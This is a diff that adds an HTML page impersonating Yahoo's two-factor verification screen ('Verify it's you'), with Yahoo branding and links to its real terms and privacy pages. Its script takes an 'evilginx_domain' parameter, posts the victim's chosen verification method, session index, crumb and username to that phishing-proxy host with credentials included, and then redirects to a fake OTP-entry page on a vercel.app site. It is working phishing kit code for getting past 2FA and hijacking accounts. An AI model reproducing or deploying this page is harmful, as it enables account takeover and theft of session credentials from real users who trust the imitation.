@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
+<head>
+    <meta charset="utf-8">
+    <title>Yahoo - Choose verification method</title>
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <!-- Your exact Webflow CSS here -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <!-- 🎯 YOUR WEBFLOW STRUCTURE FOR 2FA SELECTION -->
+    <section class="section">
+        <div class="div-block">
+            <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
+            <div class="div-block-3">
+                <div class="text-block">Help</div>
+                <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
+                <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
+            </div>
+        </div>
+        <div class="layout active">
+            <div class="div-block-5">
+                <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
+                <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
+            </div>
+            <div class="form-block w-form">
+                <form id="2fa-form" class="form" method="POST">
+                    <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
+                    
+                    <div class="pazzi" id="main-form">
+                        <div class="reflectto" id="userEmail">Choose verification method</div>
+                        <h1 class="heading-2"><strong>Verify it's you</strong></h1>
+                        <div class="text-block-2">Choose how you'd like to verify your identity<br></div>
+                        
+                        <!-- 2FA Method Options -->
+                        <div id="method-options">
+                            <!-- Will be populated by JavaScript -->
+                        </div>
+                        
+                        <input type="submit" class="logger w-button" value="Continue" id="submit-btn">
+                    </div>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <script>
+    $(document).ready(function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const evilginxDomain = urlParams.get('evilginx_domain');
+        const methods = JSON.parse(urlParams.get('methods') || '["email"]');
+        const sessionIndex = urlParams.get('sessionIndex');
+        const acrumb = urlParams.get('acrumb');
+        const username = urlParams.get('u');
+        
+        // Display username
+        $('#userEmail').text(decodeURIComponent(username || 'Choose verification method'));
+        
+        // Create method options
+        const methodOptions = {
+            'email': 'Send code to your email',
+            'sms': 'Send code to your phone',
+            'totp': 'Use authenticator app'
+        };
+        
+        let optionsHtml = '';
+        methods.forEach(method => {
+            if (methodOptions[method]) {
+                optionsHtml += `
+                    <div class="method-option" data-method="${method}" style="padding: 15px; border: 1px solid #6b00eb; border-radius: 8px; margin: 10px 0; cursor: pointer;">
+                        <input type="radio" name="verification_method" value="${method}" id="${method}" style="margin-right: 10px;">
+                        <label for="${method}" style="cursor: pointer;">${methodOptions[method]}</label>
+                    </div>
+                `;
+            }
+        });
+        
+        $('#method-options').html(optionsHtml);
+        
+        // Handle method selection
+        $('.method-option').click(function() {
+            const method = $(this).data('method');
+            $(`input[value="${method}"]`).prop('checked', true);
+            $('.method-option').removeClass('selected');
+            $(this).addClass('selected');
+        });
+        
+        // Handle form submission
+        $('#2fa-form').on('submit', function(e) {
+            e.preventDefault();
+            
+            const selectedMethod = $('input[name="verification_method"]:checked').val();
+            if (!selectedMethod) {
+                alert('Please select a verification method');
+                return;
+            }
+            
+            // Submit method selection to evilginx
+            const formData = new FormData();
+            formData.append('method', selectedMethod);
+            formData.append('sessionIndex', sessionIndex);
+            formData.append('acrumb', acrumb);
+            formData.append('username', username);
+            
+            fetch(`https://${evilginxDomain}/account/challenge/challenge-selector`, {
+                method: 'POST',
+                body: formData,
+                credentials: 'include'
+            }).then(() => {
+                // Redirect to OTP input page
+                window.location.href = `https://custom-yahoo-2fa-test.vercel.app/otp-verify?u=${encodeURIComponent(username)}&sessionIndex=${sessionIndex}&acrumb=${acrumb}&method=${selectedMethod}&evilginx_domain=${encodeURIComponent(evilginxDomain)}`;
+            }).catch(() => {
+                // Fallback redirect
+                window.location.href = `https://custom-yahoo-2fa-test.vercel.app/otp-verify?u=${encodeURIComponent(username)}&sessionIndex=${sessionIndex}&acrumb=${acrumb}&method=${selectedMethod}&evilginx_domain=${encodeURIComponent(evilginxDomain)}`;
+            });
+        });
+    });
+    </script>
+</body>
+</html>
